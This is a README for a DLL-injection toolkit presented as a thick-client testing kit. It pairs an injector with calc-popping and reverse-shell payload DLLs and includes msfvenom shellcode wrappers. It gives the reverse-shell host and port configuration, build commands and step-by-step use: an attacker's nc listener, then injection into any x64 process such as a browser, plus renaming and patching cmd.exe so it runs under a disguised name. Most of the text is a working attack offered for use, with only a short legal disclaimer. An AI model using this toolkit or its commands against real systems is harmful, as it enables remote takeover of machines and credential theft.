# process-injection-2

Full DLL-injection toolkit for thick-client testing: the injector, two payload families, and reusable source for building your own.

**Technique**: DLL injection via `CreateRemoteThread + LoadLibraryA` (MITRE ATT&CK T1055.001). The injector allocates a buffer inside the target process, writes a DLL path into it, then starts a remote thread at `kernel32!LoadLibraryA` with that path as its argument — the target's own loader does the work. Once loaded, the DLL spawns a thread that does whatever you want: pop calc, open a reverse shell, dump creds, etc.

## Layout

```
process-injection-2/
├── pop.cpp                     injector source
├── pop.exe                     pre-built x64 injector
├── pop-calc/                   quick visual-proof payloads (pops calc.exe)
│   ├── pop_calc.cpp
│   ├── pop_calc.exe            standalone EXE
│   ├── pop_calc_dll.cpp
│   ├── pop_calc_dll.dll        DLL variant (for injection)
│   └── build.ps1
└── reverse-shell/              interactive-shell payloads
    ├── revshell_pure.cpp
    ├── revshell_pure.exe       standalone EXE
    ├── revshell_pure_dll.cpp   DLL — copies cmd.exe next to the host EXE,
    ├── revshell_pure_dll.dll   patches FileDescription, spawns renamed copy
    ├── revshell_sc.cpp         msfvenom-shellcode wrapper variants
    ├── revshell_sc_dll.cpp
    └── build.ps1
```

## Config (in `reverse-shell/revshell_pure_dll.cpp`)

```cpp
static const char*    LHOST                = "192.168.68.101";
static const int      LPORT                = 4444;
static const char*    CHILD_EXE_NAME       = "revShell.exe";
static const wchar_t* DESCRIPTION_OVERRIDE = L"RevShell - WinCmd Proc";
```

Edit these, rebuild.

## Build

**Windows (MSVC v143)** — "x64 Native Tools Command Prompt for VS 2022":

```
cl /EHsc /O2 /nologo pop.cpp /link psapi.lib user32.lib advapi32.lib /OUT:pop.exe

cl /LD /EHsc /O2 /nologo pop-calc\pop_calc_dll.cpp         /OUT:pop-calc\pop_calc_dll.dll
cl /LD /EHsc /O2 /nologo reverse-shell\revshell_pure_dll.cpp /link ws2_32.lib /OUT:reverse-shell\revshell_pure_dll.dll
```

**Linux (one-liner — installs cross-compiler if missing, then builds everything)**:

```bash
sudo apt install -y mingw-w64 && \
  x86_64-w64-mingw32-g++ -shared -O2 -s -o pop-calc/pop_calc_dll.dll pop-calc/pop_calc_dll.cpp -Wl,--subsystem,windows,--kill-at && \
  x86_64-w64-mingw32-g++ -shared -O2 -s -o reverse-shell/revshell_pure_dll.dll reverse-shell/revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
```

(`pop.exe` is Windows-only — build on Windows with MSVC.)

## Use

### Pop calc (visual proof, no listener needed)

```powershell
pop.exe <target_name_or_pid> --dll pop-calc\pop_calc_dll.dll
```

Calc appears as a child of the target. Target survives.

### Reverse shell (interactive)

```bash
# Attacker
nc -lvnp 4444
```

```powershell
# Victim — inject into any x64 process
pop.exe <target_name_or_pid> --dll reverse-shell\revshell_pure_dll.dll
```

Shell lands on your listener. Child process appears under the target as `RevShell - WinCmd Proc` (big text) with image name `revShell.exe` — identifiable at a glance.

Works on any x64 app you can open: MVTC, chrome, firefox, your lab target, etc.

## Legal

Authorized testing only. Running against systems you don't own or weren't given explicit permission to test is a crime in most jurisdictions.
